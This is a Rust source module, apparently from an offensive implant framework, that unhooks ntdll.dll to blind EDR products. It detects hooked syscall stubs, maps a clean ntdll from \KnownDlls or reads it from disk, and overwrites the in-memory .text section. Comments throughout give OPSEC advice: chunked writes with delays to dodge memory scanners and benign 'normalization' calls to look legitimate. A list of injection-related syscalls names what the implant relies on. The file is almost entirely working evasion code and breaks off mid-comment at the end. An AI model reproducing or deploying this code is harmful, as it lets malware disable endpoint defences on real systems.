//! NTDLL unhooking via \KnownDlls re-fetch.
//!
//! Re-fetches a clean copy of ntdll.dll from the `\KnownDlls\ntdll.dll`
//! section object (a kernel-maintained read-only mapping of the on-disk file
//! that is **not hookable** by user-mode EDR) and overlays the `.text`
//! section onto the in-memory (potentially hooked) ntdll.
//!
//! This is the **fallback** when Halo's Gate fails — i.e., when EDR patches
//! more than a few bytes of the syscall stub, making adjacent-stub reading
//! impossible.
//!
//! # Algorithm
//!
//! 1. **Detection** (`are_syscall_stubs_hooked`): Inspect the first bytes of
//!    each critical syscall stub for hook indicators (JMP, UD2, RET).
//! 2. **KnownDlls path**: `NtOpenSection("\KnownDlls\ntdll.dll")` →
//!    `NtMapViewOfSection` (read-only) → parse PE → overwrite `.text`.
//! 3. **Disk fallback**: If KnownDlls is blocked, `NtCreateFile` →
//!    `NtReadFile` → parse PE → overwrite `.text`.
//! 4. **Cache invalidation**: Clear the `nt_syscall` SSN cache so
//!    subsequent calls re-resolve from the clean ntdll.
//!
//! # OPSEC considerations
//!
//! - **Chunked writes**: `.text` is overwritten in 4 KiB chunks with short
//!   delays between them, making the modification look less like a bulk
//!   overwrite to memory-scanning EDR.
//! - **Post-unhook normalization**: Immediately call a benign ntdll function
//!   (`NtQueryPerformanceCounter`) to normalize the execution flow.
//! - **KnownDlls preferred**: Avoids file I/O events that EDR can monitor.

#![cfg(windows)]

use std::ffi::c_void;
use std::ptr;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::Duration;

// ── Critical syscall function names ─────────────────────────────────────────
//
// These are the functions Orchestra uses via indirect syscalls. If any of
// them are hooked, we need to unhook.

const CRITICAL_SYSCALLS: &[&str] = &[
    "NtAllocateVirtualMemory",
    "NtProtectVirtualMemory",
    "NtWriteVirtualMemory",
    "NtReadVirtualMemory",
    "NtCreateThreadEx",
    "NtOpenProcess",
    "NtOpenThread",
    "NtQueueApcThread",
    "NtSetContextThread",
    "NtGetContextThread",
    "NtClose",
    "NtFreeVirtualMemory",
    "NtQueryVirtualMemory",
    "NtQuerySystemInformation",
    "NtMapViewOfSection",
    "NtUnmapViewOfSection",
    "NtCreateSection",
    "NtOpenSection",
    "NtCreateFile",
    "NtReadFile",
    "NtSetInformationProcess",
    "NtFlushInstructionCache",
    "NtQueryPerformanceCounter",
];

// ── NT constants ────────────────────────────────────────────────────────────

const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_READONLY: u32 = 0x02;
const SECTION_MAP_READ: u32 = 0x0004;
const OBJ_CASE_INSENSITIVE: u32 = 0x0040;
const SEC_IMAGE: u32 = 0x0100_0000;
const FILE_SHARE_READ: u32 = 0x00000001;
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
const SYNCHRONIZE: u32 = 0x00100000;
const FILE_READ_DATA: u32 = 0x00000001;
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const MEM_RELEASE: u32 = 0x8000;
const IMAGE_SCN_MEM_EXECUTE: u32 = 0x20000000;

/// Size of each chunk for anti-EDR chunked overwriting.
const UNHOOK_CHUNK_SIZE: usize = 0x1000; // 4 KiB

/// Delay between chunks (microseconds) to avoid bulk-write signatures.
const UNHOOK_CHUNK_DELAY_US: u64 = 50; // 50 µs

/// Last time `are_syscall_stubs_hooked()` was called and returned true.
static LAST_HOOK_DETECTION: AtomicU64 = AtomicU64::new(0);

/// Last time `unhook_ntdll()` completed successfully.
static LAST_UNHOOK_TIME: AtomicU64 = AtomicU64::new(0);

// ── PE header types (minimal, avoids winapi import complexity) ──────────────

#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    _pad: [u8; 58],
    e_lfanew: u32,
}

#[repr(C)]
struct ImageNtHeaders64 {
    signature: u32,
    // FILE_HEADER (20 bytes)
    machine: u16,
    number_of_sections: u16,
    _file_pad: [u8; 16],
    // OPTIONAL_HEADER (starts here)
    magic: u16,
    _opt_pad: [u8; 30], // up to SizeOfImage at offset 56 in optional header
    size_of_image: u32,
    _opt_pad2: [u8; 4], // after SizeOfImage
    size_of_headers: u32,
    _opt_pad3: [u8; 112], // rest of optional header to data directories
    // We don't need data directories for section walking — sections follow immediately
}

#[repr(C)]
struct ImageSectionHeader {
    name: [u8; 8],
    misc_virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    _rest: [u8; 16],
}

// ── Detection ───────────────────────────────────────────────────────────────

/// Check whether any critical syscall stub in the loaded ntdll is hooked.
///
/// A **clean** syscall stub begins with one of:
/// - `4C 8B D1` — `mov r10, rcx` (the standard NT x64 prologue)
/// - `B8 xx xx xx xx` — `mov eax, <SSN>` (some Windows versions)
///
/// A **hooked** stub begins with one of:
/// - `E9` — `jmp rel32` (inline hook, 5-byte detour)
/// - `EB` — `jmp rel8` (short jump detour)
/// - `FF 25` — `jmp [rip+offset]` (absolute indirect jump)
/// - `0F 0B` — `ud2` (stub has been neutered)
/// - `C3` — `ret` (stub immediately returns, neutered)
///
/// Returns `true` if any critical stub is hooked, `false` if all appear clean.
pub unsafe fn are_syscall_stubs_hooked() -> bool {
    let ntdll_base = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
        Some(b) => b,
        None => {
            log::warn!("[ntdll_unhook] cannot resolve ntdll base — assuming hooked");
            return true;
        }
    };

    for func_name in CRITICAL_SYSCALLS {
        let mut name_bytes = func_name.as_bytes().to_vec();
        name_bytes.push(0);
        let hash = pe_resolve::hash_str(&name_bytes);
        let func_addr = match pe_resolve::get_proc_address_by_hash(ntdll_base, hash) {
            Some(a) => a,
            None => continue, // function not found — skip, not a hook indicator
        };

        // Read first 4 bytes of the stub.
        let prologue = std::slice::from_raw_parts(func_addr as *const u8, 4);

        // Check for clean prologue: 4C 8B D1 (mov r10, rcx) or B8 (mov eax, imm32)
        let is_clean = (prologue[0] == 0x4C && prologue[1] == 0x8B && prologue[2] == 0xD1)
            || (prologue[0] == 0xB8);

        if !is_clean {
            // Check for specific hook indicators
            let hooked = prologue[0] == 0xE9 // jmp rel32
                || prologue[0] == 0xEB // jmp rel8
                || (prologue[0] == 0xFF && prologue[1] == 0x25) // jmp [rip+offset]
                || (prologue[0] == 0x0F && prologue[1] == 0x0B) // ud2
                || prologue[0] == 0xC3; // ret (neutered)

            if hooked {
                log::warn!(
                    "[ntdll_unhook] {} appears hooked (prologue: {:02X} {:02X} {:02X} {:02X})",
                    func_name,
                    prologue[0],
                    prologue[1],
                    prologue[2],
                    prologue[3],
                );

                // Record detection timestamp
                let now = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs();
                LAST_HOOK_DETECTION.store(now, Ordering::Relaxed);

                return true;
            }
            // Unknown prologue — could be a different hook style or OS variant.
            // Log but don't trigger unhooking based on one unknown byte.
            log::debug!(
                "[ntdll_unhook] {} has unusual prologue: {:02X} {:02X} {:02X} {:02X}",
                func_name,
                prologue[0],
                prologue[1],
                prologue[2],
                prologue[3],
            );
        }
    }

    false
}

// ── PE section parsing helpers ──────────────────────────────────────────────

/// Find the `.text` section in a PE image at `base`.
/// Returns `(virtual_address, virtual_size, raw_data_size)`, all RVA-based.
unsafe fn find_text_section(base: usize) -> Option<(u32, u32, u32)> {
    let dos = &*(base as *const ImageDosHeader);
    if dos.e_magic != 0x5A4D {
        return None;
    }

    let nt_offset = dos.e_lfanew as usize;
    // NT headers: 4 (sig) + 20 (file header) + sizeof(optional header)
    // We need to read NumberOfSections from the file header and then walk
    // section headers which immediately follow the optional header.
    let nt_sig = *(base + nt_offset) as *const u32;
    if nt_sig != 0x4550 {
        // "PE\0\0"
        return None;
    }

    let file_header_offset = nt_offset + 4; // skip signature
    let number_of_sections = *((base + file_header_offset + 2) as *const u16);
    let size_of_optional_header = *((base + file_header_offset + 16) as *const u16);

    let section_offset = file_header_offset + 20 + size_of_optional_header as usize;

    for i in 0..number_of_sections {
        let sec_ptr = (base + section_offset + (i as usize) * 40) as *const ImageSectionHeader;
        let sec = &*sec_ptr;

        // Check if this is the .text section by name or by execute flag
        let is_text_name = sec.name[0] == b'.'
            && sec.name[1] == b't'
            && sec.name[2] == b'e'
            && sec.name[3] == b'x'
            && sec.name[4] == b't';

        // Also check for IMAGE_SCN_MEM_EXECUTE flag as a fallback
        let characteristics = *(sec_ptr as *const u8).add(36) as u32
            | (*(sec_ptr as *const u8).add(37) as u32) << 8
            | (*(sec_ptr as *const u8).add(38) as u32) << 16
            | (*(sec_ptr as *const u8).add(39) as u32) << 24;
        let has_execute = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;

        if is_text_name || (has_execute && sec.virtual_address != 0) {
            return Some((
                sec.virtual_address,
                sec.misc_virtual_size,
                sec.size_of_raw_data,
            ));
        }
    }

    None
}

/// Find the `.text` section from raw file bytes (for disk fallback).
/// Returns `(file_offset_of_raw_data, raw_data_size, virtual_address, virtual_size)`.
unsafe fn find_text_section_from_file(
    file_buf: &[u8],
) -> Option<(u32, u32, u32, u32)> {
    if file_buf.len() < 64 {
        return None;
    }
    let base = file_buf.as_ptr() as usize;

    let dos = &*(base as *const ImageDosHeader);
    if dos.e_magic != 0x5A4D {
        return None;
    }

    let nt_offset = dos.e_lfanew as usize;
    if nt_offset + 4 + 20 > file_buf.len() {
        return None;
    }

    let nt_sig = *(base + nt_offset) as *const u32;
    if nt_sig != 0x4550 {
        return None;
    }

    let file_header_offset = nt_offset + 4;
    let number_of_sections = *((base + file_header_offset + 2) as *const u16);
    let size_of_optional_header = *((base + file_header_offset + 16) as *const u16);
    let section_offset = file_header_offset + 20 + size_of_optional_header as usize;

    for i in 0..number_of_sections {
        let sec_ptr = (base + section_offset + (i as usize) * 40) as *const ImageSectionHeader;
        if (sec_ptr as usize) + 40 > base + file_buf.len() {
            break;
        }
        let sec = &*sec_ptr;

        let is_text_name = sec.name[0] == b'.'
            && sec.name[1] == b't'
            && sec.name[2] == b'e'
            && sec.name[3] == b'x'
            && sec.name[4] == b't';

        let characteristics = *(sec_ptr as *const u8).add(36) as u32
            | (*(sec_ptr as *const u8).add(37) as u32) << 8
            | (*(sec_ptr as *const u8).add(38) as u32) << 16
            | (*(sec_ptr as *const u8).add(39) as u32) << 24;
        let has_execute = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;

        if is_text_name || (has_execute && sec.virtual_address != 0) {
            // For file-based parsing, we need PointerToRawData (offset 20 in section header)
            let raw_data_ptr = (sec_ptr as *const u8).add(20);
            let pointer_to_raw_data = *(raw_data_ptr as *const u32);
            return Some((
                pointer_to_raw_data,
                sec.size_of_raw_data,
                sec.virtual_address,
                sec.misc_virtual_size,
            ));
        }
    }

    None
}

// ── Cache invalidation ──────────────────────────────────────────────────────

/// Invalidate the `nt_syscall` SSN cache and re-resolve all syscall stubs
/// from the now-clean ntdll.
///
/// After unhooking, the gadget addresses haven't changed (they're at fixed
/// offsets in ntdll), but the syscall numbers in the stubs may have been
/// patched by EDR to redirect to hooks. After unhooking, we re-read the
/// syscall numbers from the now-clean stubs.
fn invalidate_syscall_cache() {
    // Use the new nt_syscall API to clear the SSN cache and mark the
    // clean ntdll mapping as stale, forcing a re-map on next access.
    crate::syscalls::invalidate_syscall_cache();

    // Force re-resolve all critical syscalls so the cache is warm.
    log::debug!("[ntdll_unhook] invalidating syscall cache — re-resolving all stubs");

    for func_name in CRITICAL_SYSCALLS {
        match crate::syscalls::get_syscall_id(func_name) {
            Ok(target) => {
                log::debug!(
                    "[ntdll_unhook] re-resolved {}: SSN={}, gadget={:#x}",
                    func_name,
                    target.ssn,
                    target.gadget_addr,
                );
            }
            Err(e) => {
                log::warn!(
                    "[ntdll_unhook] failed to re-resolve {}: {}",
                    func_name,
                    e
                );
            }
        }
    }

    // Also resolve any other syscalls that might be in the cache but not in
    // our critical list — the next call will hit the clean ntdll since we've
    // just overwritten the .text section.
    log::debug!("[ntdll_unhook] cache invalidation complete");
}

// ── Chunked memcpy with anti-EDR delays ─────────────────────────────────────

/// Copy `size` bytes from `src` to `dst` in 4 KiB chunks with short delays
/// between chunks. This avoids the memory-write signature that EDR products
/// look for when detecting ntdll unhooking (a single large memcpy to .text).
unsafe fn chunked_memcpy(dst: *mut u8, src: *const u8, size: usize) {
    let mut offset = 0;
    while offset < size {
        let chunk_end = std::cmp::min(offset + UNHOOK_CHUNK_SIZE, size);
        let chunk_size = chunk_end - offset;

        ptr::copy_nonoverlapping(src.add(offset), dst.add(offset), chunk_size);

        offset = chunk_end;

        // Short delay between chunks to break up the write pattern.
        // Only delay if there are more chunks to write.
        if offset < size {
            std::thread::sleep(Duration::from_micros(UNHOOK_CHUNK_DELAY_US));
        }
    }
}

// ── Post-unhook normalization ───────────────────────────────────────────────

/// Call a benign ntdll function immediately after unhooking to "normalize"
/// the execution flow. This makes the transition from hooked to unhooked
/// less detectable to EDR that monitors for sudden changes in call patterns.
unsafe fn normalize_execution() {
    // NtQueryPerformanceCounter is a benign, frequently-called ntdll function
    // that doesn't require any special access rights. Calling it immediately
    // after unhooking creates a legitimate-looking execution trace.
    let mut counter: i64 = 0;
    let _ = syscall!(
        "NtQueryPerformanceCounter",
        &mut counter as *mut _ as u64,
        std::ptr::null_mut::<u64>() as u64,
    );
}

// ── KnownDlls unhook path ───────────────────────────────────────────────────

/// Unhook ntdll by mapping a clean copy from `\KnownDlls\ntdll.dll`.
///
/// `\KnownDlls` is a section object directory maintained by the kernel. The
/// ntdll.dll section there is mapped directly from the on-disk file at boot
/// time and is NOT hookable by user-mode EDR (it's a read-only shared section
/// backed by the kernel).
///
/// Returns `Ok(bytes_written)` on success.
unsafe fn unhook_via_known_dlls() -> anyhow::Result<usize> {
    log::debug!("[ntdll_unhook] attempting KnownDlls path");

    // ── Step 1: Open KnownDlls ntdll section ─────────────────────────────
    let mut section_name: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();
    let mut obj_name = winapi::shared::ntdef::UNICODE_STRING {
        Length: ((section_name.len() - 1) * 2) as u16,
        MaximumLength: (section_name.len() * 2) as u16,
        Buffer: section_name.as_mut_ptr(),
    };
    let mut obj_attr = winapi::shared::ntdef::OBJECT_ATTRIBUTES {
        Length: std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: ptr::null_mut(),
        ObjectName: &mut obj_name,
        Attributes: OBJ_CASE_INSENSITIVE,
        SecurityDescriptor: ptr::null_mut(),
        SecurityQualityOfService: ptr::null_mut(),
    };

    // Open the \KnownDlls directory first, then open ntdll.dll within it.
    // Actually, we can use \KnownDlls\ntdll.dll directly as the path.
    let mut full_name: Vec<u16> = "\\KnownDlls\\ntdll.dll\0".encode_utf16().collect();
    obj_name.Length = ((full_name.len() - 1) * 2) as u16;
    obj_name.MaximumLength = (full_name.len() * 2) as u16;
    obj_name.Buffer = full_name.as_mut_ptr();

    let mut h_section: usize = 0;
    let status = syscall!(
        "NtOpenSection",
        &mut h_section as *mut _ as u64,
        (SECTION_MAP_READ | SYNCHRONIZE) as u64,
        &mut obj_attr as *mut _ as u64,
    )
    .map_err(|e| anyhow::anyhow!("NtOpenSection(KnownDlls\\ntdll.dll) failed: {}", e))?;

    if status < 0 {
        return Err(anyhow::anyhow!(
            "NtOpenSection(KnownDlls\\ntdll.dll) NTSTATUS {:#010x}",
            status as u32
        ));
    }

    // ── Step 2: Map the clean ntdll (read-only) ──────────────────────────
    let cur_proc: u64 = -1i64 as u64; // NtCurrentProcess
    let mut clean_base: usize = 0;
    let mut view_size: usize = 0;

    // NtMapViewOfSection: InheritDisposition = ViewUnmap (1), Win64Protect = PAGE_READONLY
    let status = syscall!(
        "NtMapViewOfSection",
        h_section as u64,           // SectionHandle
        cur_proc,                    // ProcessHandle (current process)
        &mut clean_base as *mut _ as u64, // BaseAddress
        0u64,                        // ZeroBits
        0u64,                        // CommitSize
        0u64,                        // SectionOffset (NULL)
        &mut view_size as *mut _ as u64, // ViewSize
        1u64,                        // InheritDisposition = ViewUnmap
        0u64,                        // AllocationType
        PAGE_READONLY as u64,        // Win64Protect
    );

    if status < 0 || clean_base == 0 {
        let _ = syscall!("NtClose", h_section as u64);
        return Err(anyhow::anyhow!(
            "NtMapViewOfSection(KnownDlls) NTSTATUS {:#010x}",
            status as u32
        ));
    }

    log::debug!(
        "[ntdll_unhook] clean ntdll mapped at {:#x} (size {:#x})",
        clean_base,
        view_size
    );

    // ── Step 3: Find .text sections in both copies ───────────────────────
    let clean_text = find_text_section(clean_base).ok_or_else(|| {
        anyhow::anyhow!("could not find .text section in clean KnownDlls ntdll")
    })?;

    let hooked_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
        .ok_or_else(|| anyhow::anyhow!("cannot resolve hooked ntdll base"))?;

    let hooked_text = find_text_section(hooked_base).ok_or_else(|| {
        anyhow::anyhow!("could not find .text section in hooked ntdll")
    })?;

    let (clean_text_rva, clean_text_vsize, _) = clean_text;
    let (hooked_text_rva, hooked_text_vsize, _) = hooked_text;

    // Use the smaller of the two sizes to avoid overrunning
    let copy_size = std::cmp::min(clean_text_vsize, hooked_text_vsize) as usize;

    let clean_text_base = clean_base + clean_text_rva as usize;
    let hooked_text_base = hooked_base + hooked_text_rva as usize;

    log::debug!(
        "[ntdll_unhook] .text section: clean={:#x} hooked={:#x} size={:#x}",
        clean_text_base,
        hooked_text_base,
        copy_size,
    );

    // ── Step 4: Overwrite hooked .text with clean .text ──────────────────
    //
    //   a) NtProtectVirtualMemory — make hooked .text writable
    //   b) chunked_memcpy — copy clean .text over hooked .text
    //   c) NtProtectVirtualMemory — restore original protection

    // Save original protection
    let mut old_prot: u32 = 0;
    let mut prot_base = hooked_text_base;
    let mut prot_size = copy_size;

    let status = syscall!(
        "NtProtectVirtualMemory",
        cur_proc,
        &mut prot_base as *mut _ as u64,
        &mut prot_size as *mut _ as u64,
        PAGE_READWRITE as u64,
        &mut old_prot as *mut _ as u64,
    );

    if status < 0 {
        // Cleanup: unmap clean copy and close section handle
        let _ = syscall!(
            "NtUnmapViewOfSection",
            cur_proc,
            clean_base as u64,
        );
        let _ = syscall!("NtClose", h_section as u64);
        return Err(anyhow::anyhow!(
            "NtProtectVirtualMemory(RW) on hooked .text failed: NTSTATUS {:#010x}",
            status as u32
        ));
    }

    // Chunked copy with anti-EDR delays
    chunked_memcpy(
        hooked_text_base as *mut u8,
        clean_text_base as *const u8,
        copy_size,
    );

    // Restore original protection
    let mut dummy_prot: u32 = 0;
    let mut restore_base = hooked_text_base;
    let mut restore_size = copy_size;
    let _ = syscall!(
        "NtProtectVirtualMemory",
        cur_proc,
        &mut restore_base as *mut _ as u64,
        &mut restore_size as *mut _ as u64,
        old_prot as u64,
        &mut dummy_prot as *mut _ as u64,
    );

    // ── Step 5: Flush instruction cache ──────────────────────────────────
    let _ = syscall!(
        "NtFlushInstructionCache",
        cur_proc,
        hooked_text_base as u64,
        copy_size as u64,
    );

    // ── Step 6: Cleanup ──────────────────────────────────────────────────
    let _ = syscall!("NtUnmapViewOfSection", cur_proc, clean_base as u64);
    let _ = syscall!("NtClose", h_section as u64);

    log::info!(
        "[ntdll_unhook] KnownDlls unhook complete — .text overwritten ({:#x} bytes)",
        copy_size,
    );

    Ok(copy_size)
}

// ── Disk fallback unhook path ───────────────────────────────────────────────

/// Unhook ntdll by reading the on-disk file from `C:\Windows\System32\ntdll.dll`.
///
/// This is the **fallback** when `\KnownDlls` is blocked or unavailable.
/// **OPSEC warning**: Opening ntdll.dll from disk creates a file I/O event
/// that EDR can monitor. Prefer `unhook_via_known_dlls()`.
unsafe fn unhook_via_disk() -> anyhow::Result<usize> {
    log::debug!("[ntdll_unhook] attempting disk fallback path");

    let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
    let ntdll_path = format!("\\??\\{}\\System32\\ntdll.dll", sysroot);

    // ── Step 1: Open ntdll from disk ─────────────────────────────────────
    let mut path_u16: Vec<u16> = ntdll_path.encode_utf16().chain(std::iter::once(0)).collect();
    let mut obj_name = winapi::shared::ntdef::UNICODE_STRING {
        Length: ((path_u16.len() - 1) * 2) as u16,
        MaximumLength: (path_u16.len() * 2) as u16,
        Buffer: path_u16.as_mut_ptr(),
    };
    let mut obj_attr = winapi::shared::ntdef::OBJECT_ATTRIBUTES {
        Length: std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: ptr::null_mut(),
        ObjectName: &mut obj_name,
        Attributes: OBJ_CASE_INSENSITIVE,
        SecurityDescriptor: ptr::null_mut(),
        SecurityQualityOfService: ptr::null_mut(),
    };
    let mut io_status = [0u64; 2];
    let mut h_file: usize = 0;

    let status = syscall!(
        "NtCreateFile",
        &mut h_file as *mut _ as u64,
        (SYNCHRONIZE | FILE_READ_DATA) as u64,
        &mut obj_attr as *mut _ as u64,
        io_status.as_mut_ptr() as u64,
        0u64, // AllocationSize
        0u64, // FileAttributes
        FILE_SHARE_READ as u64,
        1u64,                                   // CreateDisposition = FILE_OPEN
        0x60u64,                                 // CreateOptions = FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT
    );

    if status < 0 || h_file == 0 {
        return Err(anyhow::anyhow!(
            "NtCreateFile(ntdll.dll) NTSTATUS {:#010x}",
            status as u32
        ));
    }

    // ── Step 2: Read the file into a local buffer ────────────────────────
    // We need to read enough to cover the PE headers + .text section.
    // Start with a 128 KiB buffer (enough for headers and to find .text offset).
    let mut file_buf = vec![0u8; 128 * 1024];
    let mut bytes_read: usize = 0;

    let status = syscall!(
        "NtReadFile",
        h_file as u64,
        0u64, // Event
        0u64, // ApcRoutine
        0u64, // ApcContext
        io_status.as_mut_ptr() as u64,
        file_buf.as_mut_ptr() as u64,
        file_buf.len() as u64,
        0u64, // ByteOffset (NULL = read from current position)
        0u64, // Key
    );

    let _ = syscall!("NtClose", h_file as u64);

    if status < 0 {
        return Err(anyhow::anyhow!(
            "NtReadFile(ntdll.dll) NTSTATUS {:#010x}",
            status as u32
        ));
    }

    // Get actual bytes read from IO_STATUS_BLOCK
    bytes_read = io_status[0] as usize;
    if bytes_read < file_buf.len() {
        file_buf.truncate(bytes_read);
    }

    // ── Step 3: Parse PE headers to find .text section ───────────────────
    let (raw_offset, raw_size, text_rva, text_vsize) =
        find_text_section_from_file(&file_buf)
            .ok_or_else(|| anyhow::anyhow!("could not find .text in on-disk ntdll"))?;

    // If .text extends beyond our initial read, we need to read more.
    // For typical ntdll.dll, .text is usually within the first 2 MB.
    let text_end = raw_offset as usize + raw_size as usize;

    let file_buf = if text_end > file_buf.len() {
        // Need to read more from the file
        let needed_size = text_end + 4096; // add a page of slack
        let mut big_buf = vec![0u8; needed_size];

        // Re-open and read the full file
        let mut h_file2: usize = 0;
        let mut path_u16_2: Vec<u16> = ntdll_path.encode_utf16().chain(std::iter::once(0)).collect();
        let mut obj_name_2 = winapi::shared::ntdef::UNICODE_STRING {
            Length: ((path_u16_2.len() - 1) * 2) as u16,
            MaximumLength: (path_u16_2.len() * 2) as u16,
            Buffer: path_u16_2.as_mut_ptr(),
        };
        let mut obj_attr_2 = winapi::shared::ntdef::OBJECT_ATTRIBUTES {
            Length: std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32,
            RootDirectory: ptr::null_mut(),
            ObjectName: &mut obj_name_2,
            Attributes: OBJ_CASE_INSENSITIVE,
            SecurityDescriptor: ptr::null_mut(),
            SecurityQualityOfService: ptr::null_mut(),
        };
        let mut io_status2 = [0u64; 2];
        let status2 = syscall!(
            "NtCreateFile",
            &mut h_file2 as *mut _ as u64,
            (SYNCHRONIZE | FILE_READ_DATA) as u64,
            &mut obj_attr_2 as *mut _ as u64,
            io_status2.as_mut_ptr() as u64,
            0u64,
            0u64,
            FILE_SHARE_READ as u64,
            1u64,                                   // CreateDisposition = FILE_OPEN
            0x60u64,                                 // CreateOptions = FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT
        );
        if status2 < 0 {
            return Err(anyhow::anyhow!(
                "NtCreateFile(re-read) NTSTATUS {:#010x}",
                status2 as u32
            ));
        }
        let status3 = syscall!(
            "NtReadFile",
            h_file2 as u64,
            0u64,
            0u64,
            0u64,
            io_status2.as_mut_ptr() as u64,
            big_buf.as_mut_ptr() as u64,
            big_buf.len() as u64,
            0u64,
            0u64,
        );
        let _ = syscall!("NtClose", h_file2 as u64);
        if status3 < 0 {
            return Err(anyhow::anyhow!(
                "NtReadFile(re-read) NTSTATUS {:#010x}",
                status3 as u32
            ));
        }
        big_buf
    } else {
        file_buf
    };

    let text_end = raw_offset as usize + raw_size as usize;
    if text_end > file_buf.len() {
        return Err(anyhow::anyhow!(
            "on-disk .text section ({:#x}) exceeds buffer ({:#x})",
            text_end,
            file_buf.len()
        ));
    }

    // ── Step 4: Overwrite hooked .text with on-disk .text ────────────────
    let hooked_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
        .ok_or_else(|| anyhow::anyhow!("cannot resolve hooked ntdll base"))?;

    let hooked_text_info = find_text_section(hooked_base)
        .ok_or_else(|| anyhow::anyhow!("could not find .text in hooked ntdll"))?;

    let (hooked_text_rva, hooked_text_vsize, _) = hooked_text_info;
    let hooked_text_base = hooked_base + hooked_text_rva as usize;

    // Use the minimum of on-disk raw size and in-memory virtual size
    let copy_size = std::cmp::min(raw_size as usize, hooked_text_vsize as usize);

    let cur_proc: u64 = -1i64 as u64;

    // Make hooked .text writable
    let mut old_prot: u32 = 0;
    let mut prot_base = hooked_text_base;
    let mut prot_size = copy_size;
    let status = syscall!(
        "NtProtectVirtualMemory",
        cur_proc,
        &mut prot_base as *mut _ as u64,
        &mut prot_size as *mut _ as u64,
        PAGE_READWRITE as u64,
        &mut old_prot as *mut _ as u64,
    );
    if status < 0 {
        return Err(anyhow::anyhow!(
            "NtProtectVirtualMemory(RW) failed: NTSTATUS {:#010x}",
            status as u32
        ));
    }

    // Chunked copy from file buffer to hooked .text
    let src_ptr = file_buf.as_ptr().add(raw_offset as usize);
    chunked_memcpy(hooked_text_base as *mut u8, src_ptr, copy_size);

    // Restore protection
    let mut dummy_prot: u32 = 0;
    let mut restore_base = hooked_text_base;
    let mut restore_size = copy_size;
    let _ = syscall!(
        "NtProtectVirtualMemory",
        cur_proc,
        &mut restore_base as *mut _ as u64,
        &mut restore_size as *mut _ as u64,
        old_prot as u64,
        &mut dummy_prot as *mut _ as u64,
    );

    // Flush instruction cache
    let _ = syscall!(
        "NtFlushInstructionCache",
        cur_proc,
        hooked_text_base as u64,
        copy_size as u64,
    );

    log::info!(
        "[ntdll_unhook] disk fallback unhook complete — .text overwritten ({:#x} bytes)",
        copy_size,
    );

    Ok(copy_size)
}

// ── Public API ──────────────────────────────────────────────────────────────

/// Result of an ntdll unhooking operation.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct UnhookResult {
    /// Which method was used: "known_dlls" or "disk".
    pub method: String,
    /// Number of bytes overwritten in the .text section.
    pub bytes_overwritten: usize,
    /// Whether hooks were detected before unhooking.
    pub hooks_detected: bool,
    /// Number of syscall stubs re-resolved after unhooking.
    pub stubs_re_resolved: usize,
    /// NTSTATUS error if unhooking failed (empty string on success).
    pub error: String,
}

/// Unhook ntdll.dll by re-fetching a clean copy of the `.text` section.
///
/// **Primary path**: `\KnownDlls\ntdll.dll` — a kernel-maintained read-only
/// section that EDR cannot hook.
///
/// **Fallback path**: Re-read `C:\Windows\System32\ntdll.dll` from disk.
/// Less stealthy (creates file I/O events), but works when KnownDlls is blocked.
///
/// After unhooking:
/// 1. The syscall stub cache is invalidated — all stubs are re-resolved from
///    the now-clean ntdll.
/// 2. A benign ntdll function is called to normalize the execution flow.
///
/// Returns `Ok(UnhookResult)` on success, `Err(...)` if both methods fail.
pub fn unhook_ntdll() -> anyhow::Result<UnhookResult> {
    unsafe {
        let hooks_detected = are_syscall_stubs_hooked();
        let mut bytes_overwritten: usize = 0;

        // ── Primary: KnownDlls ───────────────────────────────────────────
        let result = match unhook_via_known_dlls() {
            Ok(n) => {
                bytes_overwritten = n;
                log::info!("[ntdll_unhook] KnownDlls unhook succeeded");
                Ok("known_dlls".to_string())
            }
            Err(e) => {
                log::warn!(
                    "[ntdll_unhook] KnownDlls path failed ({}), trying disk fallback",
                    e
                );
                // ── Fallback: disk re-read ───────────────────────────────
                match unhook_via_disk() {
                    Ok(n) => {
                        bytes_overwritten = n;
                        log::info!("[ntdll_unhook] disk fallback succeeded");
                        Ok("disk".to_string())
                    }
                    Err(e2) => {
                        log::error!(
                            "[ntdll_unhook] both methods failed: KnownDlls={}, Disk={}",
                            e,
                            e2
                        );
                        Err(anyhow::anyhow!(
                            "KnownDlls: {}; Disk: {}",
                            e,
                            e2
                        ))
                    }
                }
            }
        };

        let (method, stubs_re_resolved, error) = match result {
            Ok(m) => {
                // ── Cache invalidation ────────────────────────────────────
                invalidate_syscall_cache();

                // ── Normalize execution flow ──────────────────────────────
                normalize_execution();

                // Record success timestamp
                let now = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs();
                LAST_UNHOOK_TIME.store(now, Ordering::Relaxed);

                // Count re-resolved stubs
                let mut re_resolved = 0usize;
                for func_name in CRITICAL_SYSCALLS {
                    if crate::syscalls::get_syscall_id(func_name).is_ok() {
                        re_resolved += 1;
                    }
                }

                (m, re_resolved, String::new())
            }
            Err(e) => (String::new(), 0, e.to_string()),
        };

        Ok(UnhookResult {
            method,
            bytes_overwritten,
            hooks_detected,
            stubs_re_resolved,
            error,
        })
    }
}

/// Check if unhooking is needed and perform it if hooks are detected.
///
